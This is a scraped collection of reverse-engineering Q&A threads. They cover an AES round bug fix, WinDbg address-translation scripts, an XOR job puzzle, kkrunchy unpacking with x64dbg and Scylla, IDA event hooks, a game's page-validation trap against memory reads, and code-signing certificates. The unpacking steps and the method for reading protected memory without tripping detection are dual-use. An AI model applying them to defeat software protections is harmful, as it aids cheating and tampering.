        hex += ""{:02x}"".format(e)
    return hex

def hex2list(hex):
    lst = []
    if len(hex) % 2 == 0:
        for i in range(len(hex)/2):
            lst.append(int(hex[i*2:i*2+2], 16))
    return lst

def xor(bytelist1, bytelist2):
    res = []
    length = min(len(bytelist1), len(bytelist2))
    for i in range(length):
        res.append(bytelist1[i] ^ bytelist2[i])
    return res

def aesenc(state, roundkey, last=False):
    def shift_rows(state):
        state[4], state[5], state[6], state[7] = state[5], state[6], state[7], state[4]
        state[8], state[9], state[10], state[11] = state[10], state[11], state[8], state[9]
        state[12], state[13], state[14], state[15] = state[15], state[12], state[13], state[14]

    def sub_bytes(state):
        for i in range(16):
            state[i] = SBOX[state[i]]

    def mix_columns(state):
        xtime = lambda a: (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)

        def mix_column(col):
            t = col[0] ^ col[1] ^ col[2] ^ col[3]
            u = col[0]
            col[0] ^= t ^ xtime(col[0] ^ col[1])
            col[1] ^= t ^ xtime(col[1] ^ col[2])
            col[2] ^= t ^ xtime(col[2] ^ col[3])
            col[3] ^= t ^ xtime(col[3] ^ u)
            return _col

        return mix_column(state[0::4]) + \
                mix_column(state[1::4]) + \
                mix_column(state[2::4]) + \
                mix_column(state[3::4])

    sub_bytes(state)
    shift_rows(state)
    if not last:
        state = mix_columns(state)
    return xor(state, roundkey)

data = hex2list(""E98E03FAEAD91A951F6269D0D4DAFAD6"")
key = hex2list(""C62E6AD8CC162D7E210D91A142F2927B"")

res = aesenc(data, key)
print list2hex(res)
</code></pre>
","<p>Three problems:</p>

<ol>
<li><code>mix_column</code> returns <code>_col</code> (typo underscore?)</li>
<li>The return value of <code>mix_columns</code> just concatenates the columns together like rows instead of slotting them back into columns - effectively transposing the result.</li>
<li><p><code>AESENC</code> takes its parameters and returns its results as columns concatenated together. Your <code>aesenc</code> takes the parameters and returns the results as rows concatenated together:</p>

<pre><code>AESENC(E98E03FAEAD91A951F6269D0D4DAFAD6, C62E6AD8CC162D7E210D91A142F2927B)
       data = E9 EA 1F D4                key = C6 CC 21 42
              8E D9 62 DA                      2E 16 0D F2
              03 1A 69 FA                      6A 2D 91 92
              FA 95 D0 D6                      D8 7E A1 7B
</code></pre></li>
</ol>

<p>This is the script adjusted so that it emits the same values as the <code>AESENC</code> instruction:</p>

<pre><code>SBOX = (
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
)

def transpose4x4(m):
    return m[0::4] + m[1::4] + m[2::4] + m[3::4]

def list2hex(list):
    hex = """"
    for e in list:
        hex += ""{:02x}"".format(e)
    return hex

def hex2list(hex):
    lst = []
    if len(hex) % 2 == 0:
    for i in range(len(hex)/2):
        lst.append(int(hex[i*2:i*2+2], 16))
    return lst

def xor(bytelist1, bytelist2):
    res = []
    length = min(len(bytelist1), len(bytelist2))
    for i in range(length):
        res.append(bytelist1[i] ^ bytelist2[i])
    return res

def aesenc(state, roundkey, last=False):
    def shift_rows(state):
        state[4], state[5], state[6], state[7] = state[5], state[6], state[7], state[4]
        state[8], state[9], state[10], state[11] = state[10], state[11], state[8], state[9]
        state[12], state[13], state[14], state[15] = state[15], state[12], state[13], state[14]

    def sub_bytes(state):
        for i in range(16):
            state[i] = SBOX[state[i]]

    def mix_columns(state):
        xtime = lambda a: (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)

        def mix_column(col):
            t = col[0] ^ col[1] ^ col[2] ^ col[3]
            u = col[0]
            col[0] ^= t ^ xtime(col[0] ^ col[1])
            col[1] ^= t ^ xtime(col[1] ^ col[2])
            col[2] ^= t ^ xtime(col[2] ^ col[3])
            col[3] ^= t ^ xtime(col[3] ^ u)
            return col

        out = [None]*16
        for i in range(0,4):
          out[i::4] = mix_column(state[i::4])
        return out

    sub_bytes(state)
    shift_rows(state)
    if not last:
        state = mix_columns(state)
    return xor(state, roundkey)

data = transpose4x4(hex2list(""E98E03FAEAD91A951F6269D0D4DAFAD6""))
key = transpose4x4(hex2list(""C62E6AD8CC162D7E210D91A142F2927B""))

res = transpose4x4(aesenc(data, key))
print list2hex(res)
</code></pre>
","9433"
"Page Directory Pointer Table in WinDbg","607","","<p>The !pte command in WinDbg gives all the information one may need regarding a virtual address (PDE and PTE location and content), but even on systems with PAE it says nothing about the Page Directory Pointer Table. 
I know that I can get the physical base of the PDPT by looking at CR3, and then use the highest 2 bits of the VA as a index in that table to get to the PDPT Entry, but I'm just curious if there is a command that works like !pte when it comes to PAE as it will be a nice tool to verify my address translations step by step. </p>

<p>Also, is there a way to determine MAXPHYADDR? I know it is at most 52. </p>
","<p>for <code>va to phys address translatio</code>n there is a windbg bang command<br>
<code>!vtop 0 &lt; VirtualAddress &gt;</code> .</p>

<p><strong>a sample output from that command  below</strong></p>

<pre><code>kd&gt; !vtop 0 403000
X86VtoP: Virt 00403000, pagedir 11800480
X86VtoP: PAE PDPE 11800480 - 00000000387a9001
X86VtoP: PAE PDE 387a9010 - 000000001b6b7067
X86VtoP: PAE PTE 1b6b7018 - 800000001bb2e225
X86VtoP: PAE Mapped phys 1bb2e000
Virtual address 403000 translates to physical address 1bb2e000.
</code></pre>

<p>below is a windbg script that i wrote <code>(can be buggy havent tested this in a 64 bit machine )</code><br>
this script takes a process name and a virtual address in that process splits it into pd pde pte and offset and retrieves the physical address and prints the contents.</p>

<p><strong>script contents</strong> </p>

<pre><code>r $t0 = ${$arg1}
r $t1 = ${$arg2}
r $t2 = (( @$t1 &amp; 0xc0000000 ) &gt;&gt; 0n29 )
r $t3 = (( @$t1 &amp; 0x3fe00000 ) &gt;&gt; 0n21 )
r $t4 = (( @$t1 &amp; 0x001ff000 ) &gt;&gt; 0n12 )
r $t5 = (( @$t1 &amp; 0x00000fff ) &gt;&gt; 0n00 )
.printf ""Page Directory Index      \t%x\n"" , @$t2
.printf ""Page Directory Entry Index\t%x\n"" , @$t3
.printf ""Page Table Entry Index    \t%x\n"" , @$t4
.printf ""Offset                    \t%x\n"" , @$t5
.foreach /pS 1 /ps 100 ( place { !process 0 0 ${$arg1} } ) { r $t6 = place }
.process /p /r @$t6
db @$t1
r $t7 = @@c++( *(ULONG *)@$proc-&gt;Pcb.DirectoryTableBase )
.printf ""printing PDINDEX[%08x]\n"",@$t2
!dd @$t7 + @$t2 * @@c++(sizeof(INT64)) l1
.printf ""printing PDEINDEX[%08x]\n"",@$t3
.foreach /pS 1 /ps 100 (place {!dd @$t7 + @$t2 * @@c++(sizeof(INT64)) l1 } ) {r $t8 = ( place &amp; 0xfffff000 ) ; !dd ( place &amp; 0xfffff000) l1 }
.printf ""printing PTEINDEX[%08x]\n"",@$t4
.foreach /pS 1 /ps 100 (place {!dd @$t8 + @$t3 * @@c++(sizeof(INT64)) l1 } ) {r $t9 = ( place &amp; 0xfffff000 ) ; !dd ( place &amp; 0xfffff000) l1 }
.printf ""printing Offset[%08x]\n"",@$t5
.foreach /pS 1 /ps 100 (place {!dd @$t9 + @$t4 * @@c++(sizeof(INT64)) l1 } ) {r $t10 = ( place &amp; 0xfffff000 ) ; !db ( place &amp; 0xfffff000) }
</code></pre>

<p><strong>output of a sample run</strong></p>

<pre><code>lkd&gt; $$&gt;a&lt; .\scripts\splitva.txt msgbox.exe 403000
Page Directory Index        0
Page Directory Entry Index  2
Page Table Entry Index      3
Offset                      0
Implicit process is now 86389020
Loading User Symbols
..........
00403000  49 63 7a 65 6c 69 6f 6e-27 73 20 74 75 74 6f 72  Iczelion's tutor
00403010  69 61 6c 20 6e 6f 2e 32-00 57 69 6e 33 32 20 41  ial no.2.Win32 A
00403020  73 73 65 6d 62 6c 79 20-69 73 20 47 72 65 61 74  ssembly is Great
00403030  21 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  !...............
00403040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00403050  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00403060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00403070  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
printing PDINDEX[00000000]
#11800480 387a9001
printing PDEINDEX[00000002]
#387a9000 297b9067
printing PTEINDEX[00000003]
#1b6b7000 3dcb8025
printing Offset[00000000]
#1bb2e000 49 63 7a 65 6c 69 6f 6e-27 73 20 74 75 74 6f 72 Iczelion's tutor
#1bb2e010 69 61 6c 20 6e 6f 2e 32-00 57 69 6e 33 32 20 41 ial no.2.Win32 A
#1bb2e020 73 73 65 6d 62 6c 79 20-69 73 20 47 72 65 61 74 ssembly is Great
#1bb2e030 21 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 !...............
#1bb2e040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
#1bb2e050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
#1bb2e060 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
#1bb2e070 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
</code></pre>
","6412"
"Reversing unknown data in hex string","607","","<p>I have a string from job advert (Ethical hacker). I am not planning to candidate to that position. I just would try to resolve puzzle. Can someone suggest directions to look further? (And not yet post full answer for some 2 days). Probably if someone can resolve that puzzle, then they probably will figure out from where that job advert is :).</p>

<p>The data (my guess that's a hex string):</p>

<pre><code>7d063a752c3a20753e3b3a2275213d30753734263c36267975363a3a39747c5f5f073026253a3b263c373c393c213c30266f5f7f7505303b30212734213c3a3b75213026213c3b3275343b3175313a362038303b213c3b3275213d3075333c3b313c3b32265f7f750330273c332c752320393b302734373c393c213c3026752730253a2721303175372c753a213d3027265f7f751426263c26217531302330393a25302726753c3b75333c2d3c3b327526303620273c212c75372032265f7f75063d342730752c3a2027753e3b3a22393031323075223c213d75363a39393034322030265f5f1a25253a2721203b3c213c30266f5f7f75193034273b3c3b32753b3022752130363d3b3a393a323c302675372c75213026213c3b3275313c233027263075262c26213038265f7f75063e3c3939752630217531302330393a2538303b2175213d273a20323d75262530363c34393c2f3031752127343c3b3c3b32265f7f75173075347525342721753a337526303620273c212c753c3b363c31303b2175273026253a3b263075213034385f5f02343b2175213a753f3a3c3b7520266a7512302175213d3075363a3b21343621267533273a386f5f3d212125266f7a7a3f3a377b3d61363e7b38307a363a3b213436217a
</code></pre>

<p>I tried to convert it to string. Output is like this: <a href=""https://i.stack.imgur.com/bNe08.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/bNe08.png"" alt=""Output""></a>
It looks like of some kind of protocol. I also tried to decompress, but that failed and looked at output it does not look like it would be compressed. </p>

<p>C# program to create string from that data.</p>

<pre><code>class Program
    {
        static string bytearr = ""7d063a752c3a20753e3b3a2275213d30753734263c36267975363a3a39747c5f5f073026253a3b263c373c393c213c30266f5f7f7505303b30212734213c3a3b75213026213c3b3275343b3175313a362038303b213c3b3275213d3075333c3b313c3b32265f7f750330273c332c752320393b302734373c393c213c3026752730253a2721303175372c753a213d3027265f7f751426263c26217531302330393a25302726753c3b75333c2d3c3b327526303620273c212c75372032265f7f75063d342730752c3a2027753e3b3a22393031323075223c213d75363a39393034322030265f5f1a25253a2721203b3c213c30266f5f7f75193034273b3c3b32753b3022752130363d3b3a393a323c302675372c75213026213c3b3275313c233027263075262c26213038265f7f75063e3c3939752630217531302330393a2538303b2175213d273a20323d75262530363c34393c2f3031752127343c3b3c3b32265f7f75173075347525342721753a337526303620273c212c753c3b363c31303b2175273026253a3b263075213034385f5f02343b2175213a753f3a3c3b7520266a7512302175213d3075363a3b21343621267533273a386f5f3d212125266f7a7a3f3a377b3d61363e7b38307a363a3b213436217a"";
        static void Main(string[] args)
        {
            byte[] b = StringToByteArray(bytearr);
            string s = System.Text.Encoding.UTF8.GetString(b);
            File.WriteAllBytes(""output.bin"", b);
            Console.WriteLine(""{0}"", s);
            Console.ReadLine();
        }

        public static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i &lt; NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }
    }
</code></pre>

<p><strong>Update.</strong></p>

<p>Thanks to <a href=""https://reverseengineering.stackexchange.com/users/2318/w-s"">@w s</a> for hints. Today I resolved puzzle. It took 5 to 6 hours. </p>

<p>So, the answer ...</p>

<p>First I googled around and found <a href=""https://digital-forensics.sans.org/blog/2013/05/14/tools-for-examining-xor-obfuscation-for-malware-analysis"" rel=""nofollow noreferrer"">this</a> article. Then I tried XORSearch. After that I got next challenge. I do not post it here but that was web login form. So, I should guess username and password. Luckily in that form was sql injection vulnerability. After successful login it displayed QR code as PNG image. Of course I cannot decode it with scanner. So, I tried various steganography tools. Unsuccessful. Tried more various tools and then I realized that I am digging too deep. Then I printed that QR code. Looked on it couple of minutes. Tried various online QR decoders. All they failed. Googled about QR code error corrections and broken QR code recovery. Found <a href=""http://datagenetics.com/blog/november12013/index.html"" rel=""nofollow noreferrer"">this site</a>. On three corners must be square blocks to identify and then align the code. For my image they did'n. </p>

<p><a href=""https://i.stack.imgur.com/7sAV2.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/7sAV2.png"" alt=""QR code (some part removed)""></a> 
I deleted some part of QR code.</p>

<p>So I took black pencil and colored my printed QR code. Tried to scan it. Scanner made one successful scan. But it was some numbers. After I again looked at printed QR code I realized that it looks bad. Then I realized that QR code must reverse colors. And volā. It now looks like normal QR and scanner successfully scanned it. In that picture was another link to text file, where was job contact details. </p>

<p>P.S The only think that I not fully understood is XOR`ing part. But I tried to study that :).</p>
","<p>This is an encrypted message (hex-encoded, your guess is correct). The cipher is very weak.
As far as I understand there is at least one more additional challenge after this one.</p>

<p>If you want to learn more about working with challenges like this I'd suggest you to try <a href=""https://cryptopals.com/"" rel=""nofollow"">""Matasano crypto challenges""</a>.</p>
","13606"
"How to unpack kkrunchy executables?","606","","<p>I'm trying to figure out how to unpack kkruncy executable, <a href=""https://github.com/farbrausch/fr_public/tree/master/kkrunchy"" rel=""nofollow noreferrer"">sources here</a> and <a href=""http://www.farbrausch.de/~fg/kkrunchy/"" rel=""nofollow noreferrer"">binaries here</a>, anyone knows how to do it?</p>

<p>My main idea was testing out some little hello world exes compressed with kkrunchy but for some reason the exes will crash. Ie:</p>

<pre><code>#define UNICODE

#include &lt;windows.h&gt;

void start()
{
    MessageBox(NULL, L""X"", L""Y"", MB_OK);
}
</code></pre>

<p>or:</p>

<pre><code>global start
; kernel32.lib Exports
extern _ExitProcess@4
extern _GetStdHandle@4
extern _WriteFile@20

section .text

start:
    ; DWORD  bytes;
    mov     ebp, esp
    sub     esp, 4

    ; hStdOut = GetstdHandle( STD_OUTPUT_HANDLE)
    push    -11
    call    _GetStdHandle@4
    mov     ebx, eax

    ; WriteFile( hstdOut, message, length(message), &amp;bytes, 0);
    push    0
    lea     eax, [ebp-4]
    push    eax
    push    (message_end - message)
    push    message
    push    ebx
    call    _WriteFile@20

    ; ExitProcess(0)
    push    0
    call    _ExitProcess@4

    ; never here
    hlt
message:
    db      'Hello', 10, 13, 0
message_end:
</code></pre>

<p>I've used the default parameters but the executables are broken. In any case, how could i figure out how to unpack kkrunchy executables?</p>
","<p>For my unpacking session I'm using <a href=""http://x64dbg.com"" rel=""nofollow noreferrer"">x64dbg</a> and I will unpack the executable in <a href=""http://www.farbrausch.de/~fg/kkrunchy/kkrunchy_023a2.zip"" rel=""nofollow noreferrer"">kkrunchy_023a2.zip</a>.</p>

<p>Get to the entry point and enable trace record. Also bind the <code>Trace into beyond trace record</code> option to say <code>Ctrl+/</code>.</p>

<p><img src=""https://i.imgur.com/OrrTbBO.png"" alt=""trace record entry point""></p>

<p>Next up, press <code>G</code> (for graph) and you should see the return blocks marked in red.</p>

<p><img src=""https://i.imgur.com/gkzsNl7.png"" alt=""graph return""></p>

<p>Put a breakpoint on both of them, run, step and you will notice a function with a suspiciously large graph...</p>

<p><img src=""https://i.imgur.com/uIqrQz5.png"" alt=""large graph""></p>

<p>Now go ahead and use that <code>Trace into beyond trace record</code> function to keep stepping through while skipping the instructions that were already traced over. You will quickly notice that this algorithm is exhausting the (default) <code>50000</code> step count and a bit of clicking around will tell you where the loop condition is.</p>

<p><img src=""https://i.imgur.com/PDUaEqd.png"" alt=""loop condition""></p>

<p>Put a hardware breakpoint on that destination, run and you should see the original entry point.</p>

<p><img src=""https://i.imgur.com/TIOJ86d.png"" alt=""oep""></p>

<p>Next up open Scylla <code>Ctrl+I</code>, hit <code>IAT Autosearch</code>, <code>OK</code>, <code>Get Imports</code>, <code>Dump</code>, <code>Fix Dump</code> and you have an unpacked executable. I will leave it upto you to properly clean out the garbage from that dump...</p>
","14040"
"How to get notified about IDA database events not covered in the IDA SDK?","605","","<p>In my <a href=""https://reverseengineering.stackexchange.com/questions/1906/how-can-my-plugin-get-notified-of-anterior-or-posterior-comments-and-more-chan"">previous question</a> I had originally asked for this, but since this aspect of the question was completely disregarded, I feel compelled to ask it separately.</p>

<p>There are certain events apparently not covered in the IDA SDK. I learned in the above linked question that anterior and posterior comments are supported, but what about other events such as when I press <kbd>h</kbd> (e.g. <code>2Ah</code> becomes <code>42</code>) to change the number to base 10 (and back) or <kbd>r</kbd> to show it as character (e.g. <code>2Ah</code> becomes <code>*</code>).</p>

<p>How would I go about to catch these?</p>

<p><strong>NB:</strong> in general this question would also relate to IDA versions prior to the ones supporting a particular event notification. E.g. the IDA SDK 6.4, according to Igor, introduced notifications for anterior and posterior comments. How can I get older versions and 6.4 to co-operate w.r.t. those events in conjunction with <a href=""http://sourceforge.net/projects/collabreate/"" rel=""nofollow noreferrer"">collabREate</a>?</p>

<p>I know that it is allowed to reverse engineer IDA itself, so what I am looking for are pointers.</p>
","<p>When I needed to do a similar task I ended up hooking the IDB save event and then scanned the IDB for modifications using the IDA API before each user save. it took about a few seconds to scan the entire function list, aggregating most information for both functions and data elements.</p>

<p>To me, that sounds like a more practical approach than trying to reverse engineer IDA and patching these hooks in, especially when trying to catch UI events such as user hotkeys.</p>

<p>one point to note though, is that aggregating structure/enum data might be difficult if you choose not to rely on IDA's id numbers if you're doing to handle more than one IDB file.</p>

<p>If you do wish to reverse engineer IDA, it'll be very interesting to join a discussion on the topic somewhere.
since IDA now uses Qt for most of it's UI (though I'll guess the migration to Qt wasn't as smooth as one could hope), a great starting point into Qt will be <a href=""http://www.codeproject.com/Articles/31330/Qt-Internals-Reversing"" rel=""nofollow noreferrer"">Daniel Pistelli's Qt Internals and Reversing</a> article, which also includes an IDAPython script at the end (yet reading the entire article is highly recommended).</p>

<p>it's somewhat outdated but assuming IDA uses Qt 4.8.x there aren't many differences (if you'd like I can list the ones I know of).</p>

<p>basically, since Qt is very event-driven (and with some luck IDA 6.0 was designed with that in mind) it might be the case that you just need to listen, in Qt-dialect this is called <code>connect</code>-ing a <code>slot</code> (event handler) to a <code>signal</code> (event), for at-least some of the specific events you wish to hook.</p>

<p>I previously did some moderate Qt-IDA hacks as I call them, using Qt and PyQt to manipulate Qt objects under IDA's application. In the same manner I managed to add and edit menu items and tool bars manually, it is definitely possible to look up the context menu popup when right-clicking in IDA's disassembly view or hooking the hotkeys.</p>

<p><a href=""https://reverseengineering.stackexchange.com/questions/11181/adding-a-toolbar-to-ida-using-pyside/12999#12999"">This RE.SE</a> answer of mine might be a good place to start.</p>
","2157"
"Target application crashes when using ReadProcessMemory","605","","<p>I have an interesting application that seems to crash whenever a particular region of memory is read using <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms680553(v=vs.85).aspx"" rel=""nofollow"">ReadProcessMemory</a>. I know it's not doing anything special with RPM because:</p>

<ol>
<li>Injecting a DLL to read that region of memory directly also causes a crash.</li>
<li>Scanning regions with applications like <a href=""http://www.cheatengine.org/"" rel=""nofollow"">CheatEngine</a> also causes a crash.</li>
</ol>

<p>It's also not a guard region or a region with special protection flags. It's just a private R+W region.</p>

<p>At first I thought they were installing hardware data breakpoints like those described <a href=""http://www.codeproject.com/Articles/28071/Toggle-hardware-data-read-execute-breakpoints-prog"" rel=""nofollow"">here</a>, but after checking the debug registers of all threads and seeing that they were all zero made me conclude that another technique is used.</p>

<p>I suspect that they are somehow raising an exception whenever that piece of memory is read. I'm looking to understand what they're doing and how to detect it, or at the very least, make RPM not crash the application.</p>

<p>P.S. I cannot attach a debugger to this application, and the executable is encrypted, but I do know that various TLS callbacks are used along with VEH exception handlers.</p>
","<p>Alright, it would appear that we have an answer to this. And it's a lot simpler than I thought, and actually pretty cool.</p>

<p>Basically, they allocate some pages with no physical backing until the page is accessed. This means that any access whatsoever (even in kernel mode) will validate the page, thus allowing the application to see that the page has been validated and promptly crash the game.</p>

<p>To avoid this, you can use <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms684949(v=vs.85).aspx"" rel=""nofollow noreferrer"">QueryWorkingSetEx</a> or <a href=""https://msdn.microsoft.com/en-us/library/windows/hardware/dn957452(v=vs.85).aspx"" rel=""nofollow noreferrer"">NtQueryVirtualMemory</a> and if the ""valid"" property of the returned structure is zero, then you probably shouldn't be reading that page.</p>

<p>I can't say for certain that this is the correct answer, but it fits my analysis. If anybody has more information on this technique, specifically how to implement it with something like <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx"" rel=""nofollow noreferrer"">VirtualAlloc</a>, I would love to learn more.</p>

<p>P.S. The application doesn't appear to have any kernel mode access whatsoever, it's just a regular user mode application.</p>

<p><strong>EDIT:</strong> Sample C++ implementation can be found <a href=""https://gist.github.com/dkrutsko/d6118638b0ef711b30bfcfe5b083d067"" rel=""nofollow noreferrer"">here</a>.</p>
","12925"
"Adding new code with Ida","604","","<p>When I used CheatEngine (I know, I know...) it had this option that let you create code caves, meaning you could replace any instruction with a JMP to a new section, which contained the old instruction followed by your new code, and then JMP'd back to original place.</p>

<p>I'd like to do the same with Ida, in a way that lets me save my changes to executable. Is this possible?</p>

<p><sub>I tried adding new section manually in the segments window, but saving the executable with ""apply changes to input file"" doesn't change anything, nor does saving a ""DIF"" file.</sub></p>
","<p>As ExtremeCoders said, IDA is basically used as an analysis tool, and there are many other tools to do so like OllyDBG or x64_dbg ... still, it's not that limited.</p>

<p>I haven't tried to do so, but try to get the cave code address using PEiD (or any other PE tool that'll do), then use Fentanyl plugin to make changes and IDAPatcher plugin to save them easily.</p>
","9080"
"How do malware steal Code signing certificates?","603","","<p>While analyzing/studying/RE  exe's/dll's  you  see the certificates in peview/hexeditor etc. but how does one come to know that the certificate is a fake/malicious/expired one, there has to be a central repository of all the good or bad certificates,one which I know of is HerdProtect[.]com which tells you if the company/developer is known to distribute malware.</p>

<p>Plus, I have read that people steal code signing certificates from companies and use them to sign their malware, my question is while reversing what strings should I look for in Olly/IDA ,I'm guessing the malware will be enumerating using FindFirstFile, FindNextFile etc. for a specific file(certificate file) in the system what string do such malware look for, <strong>""OR  HAVE I GOT IT WRONG""</strong>.</p>

<p>Also many exe's are signed twice why so?Is it to fool security vendors or is it normal to sign with multiple certificates.</p>
","<p>For an executable with a digital certificate, it's easy enough to check for the certificate's information and origin by looking at the executable's properties. For example, here's what is shown for Skype:</p>

<p><a href=""https://i.stack.imgur.com/jO6he.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/jO6he.png"" alt=""enter image description here""></a></p>

<p>These certificates are issued to a developer from a trusted Certification Authority (CA) and are used to sign the executable before distributing it. In theory, the CA should fully verify the identity of the developer applying for a certificate before issuing one, but in practice a CA is still a system involving imperfect entities and it's possible for a malware author to apply for and receive a ""good"" certificate from a trusted CA while never producing anything but malware.</p>

<p>If you refer back to the first image of the Skype certificates and select ""Details"", you'll be able to get more information about the certificate and its origin:</p>

<p><a href=""https://i.stack.imgur.com/G9VaH.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/G9VaH.png"" alt=""enter image description here""></a></p>

<p>In this image, we can see exactly who the certificate was issued to and who issued it, along with relevant issue date and expiration information. This is a direct download from the official Skype site, so I can be pretty confident that the software was made by who it says. Likewise, the certificate was issued by the Microsoft Code Signing PCA, so we can be at least reasonably confident that the certificate is trustworthy. If you look at the ""Certification Path"" tab, you can trace the certificate all the way back to the root CA and again verify that everything looks as it should.</p>

<p>Determining whether or not the certificate is malicious or stolen can be difficult to detect, but is somewhat a matter of common sense. Does your certificate claim to be issued to a legitimate publisher (e.g., Microsoft) but you know that the software you downloaded is not from them? Something may be amiss. You can also look at the issuing CA and try to find information online about their reputation. Does the CA do a bad job of screening out people who distribute malware? Do they have a reputation for poor information security? If the issuer seems sketchy, then they very well may be. Relying on the reputation of CAs is a known vulnerability.</p>

<p>Now, as to your second question: the certificate consists of a private/public key pair, with the private key kept private (of course) and the public key distributed with the application. Using a code signing tool, a developer generates a hash of the executable and encrypts it with the private key. This hash is distributed with the public key portion of the certificate in the executable. On the user's end, a new hash of the executable is taken and decrypted with the public key to verify its integrity. This means that executables that have been modified after having been signed won't have a valid certificate and you should get a warning when trying to install or run them. If you want to see a list of certificates on your system (both trusted and untrusted), open up a command prompt window and run <code>certmgr</code></p>

<p>Note that in order for a legitimate certificate to be ""stolen"" and malware to sign itself with it, it would need access to the private key. If the private key is exposed (<a href=""https://www.kb.cert.org/vuls/id/925497"" rel=""nofollow noreferrer"">like what happened to Dell several years ago...</a>) then it is possible for a malware author to sign their software as if they were the developer to whom the certificate was issued. If this private key is kept private, then it should theoretically be safe. I think the answer to your second question is that you're a bit confused as to how code signing works, but if you <em>did</em> manage to come across a bit of malware that was attempting to generate signed code, I would keep an eye out for sections of code attempting to launch a <code>signtool</code> instance, loading a <code>.pfx</code> or other private key file, etc.</p>

<p>I am not an expert on code signing or certification authorities, so it's possible that there are cases where malware generates self-signed certificates, messes with root CAs on the system, etc., but someone more experienced than me would have to weigh in on that...</p>

<p>As for the dual-signing in your third question, it would be helpful to see an example of what you're talking about, but I did find that Skype is signed with two certificates. The primary difference between the two is the digest algorithm, with one being sha1 and the other sha256. This is likely a mechanism to deal with legacy users who have an operating system for which sha256 is not currently supported and require the older (and deprecated) sha1 digest algorithm. (see: <a href=""https://security.stackexchange.com/questions/109629/deprecation-of-sha1-code-signing-certificates-on-windows"">https://security.stackexchange.com/questions/109629/deprecation-of-sha1-code-signing-certificates-on-windows</a>)</p>

<p>For a more in-depth look at code signing and certification authorities, feel free to check out <a href=""https://msdn.microsoft.com/en-us/library/ms537361(v=vs.85).aspx"" rel=""nofollow noreferrer"">this MSDN article</a>.</p>
","12249"
"Hex-Rays Decompiler: Buffer on the stack","602","","<p>I am currently reversing a windows driver in order to write a Linux compatible driver for a DVB card, but I have come up against a small issue that I can work around, but if it is possible I would like to make it correct.</p>

<p>There is a function that part of which reads the 256 byte PCI config space into a local buffer that has been allocated on the stack. The decompilation shows the output as:</p>

<pre><code>unsigned __int16 configSpaceBuffer[128];

